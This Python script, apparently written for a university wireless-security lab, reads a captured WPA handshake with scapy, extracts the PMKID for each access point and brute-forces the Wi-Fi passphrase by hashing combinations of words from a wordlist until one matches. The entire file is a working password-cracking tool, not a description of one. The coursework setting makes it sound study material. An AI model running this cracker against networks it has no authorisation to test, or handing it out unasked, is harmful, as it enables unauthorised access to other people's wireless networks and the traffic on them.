#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from binascii import a2b_hex, b2a_hex
# from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
import hmac, hashlib
import itertools

'''
Authors: Julien Quartier & Nathan Séville
Date: 04.05.2020
Description: PMKID bruteforce with dictionnary

Overall code is based on previous lab (WPA)
'''

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap('PMKID_handshake.pcap') 

# Transform mac from string to binary string
def normalizeMac(mac):
    return mac2str(mac)

# Return an array of SSIDs found in packets. 
def findSSID(packets, apmac):
    for packet in packets: 
        # The SSID is advertized in Beacons
        if Dot11Beacon in packet and Dot11Elt in packet[Dot11Beacon] and packet.addr2 == apmac:
            packet = packet[Dot11Beacon]
            packet = packet[Dot11Elt]
            if packet.ID == 0: # SSID
                return packet.info.decode()

# Return the PMKIDs found in packets for each SSIDs found in packets. Station mac and ap mac are attached with pmkid as they're used for it's computations (as well as ssid used as map key)
def findPMKIDs(packets):
    PMKIDs = {}

    for packet in packets:
        if packet.haslayer(EAPOL):
            ssid = findSSID(packets, packet.addr2)
            if ssid != None:
                PMKIDs[ssid] = (packet[Raw].load[-16:], normalizeMac(packet.addr1), normalizeMac(packet.addr2))

    return PMKIDs

# Create combinations of n-words in dictionnary.
def wordCombinations(words, n):
    return list(itertools.combinations(words, n))

# Compute PMKID given the key, ssid, station mac and ap mac. Method of computation come from SWI course.
def PMKID(key, ssid, staMAC, apMAC):
    key = pbkdf2(hashlib.sha1, key, ssid, 4096, 32)
    return hmac.new(key,str.encode('PMK Name')+apMAC+staMAC,hashlib.sha1).digest()[:16]

# Read dictionnary words.
words = [line.rstrip() for line in open('wordlist.txt', 'r')]

# Max combinations of words, for admin123 enter 4 (admin-1-2-3).
maxc = int(input("Enter maximum words combinations [Int]: "))

# Get the APs PMKIDs.
APs = findPMKIDs(wpa)

# Bruteforce each APs PMKID with dictionnary word combinations.
for ssid in APs:
    for i in range(1, maxc+1):
        for key in wordCombinations(words, i):
            pmkid, stamac, apmac = APs[ssid]

            if pmkid == PMKID(str.encode(''.join(key)), str.encode(ssid), stamac, apmac):
                print("Found passphrase ", key, " for AP ", ssid)
                break
            
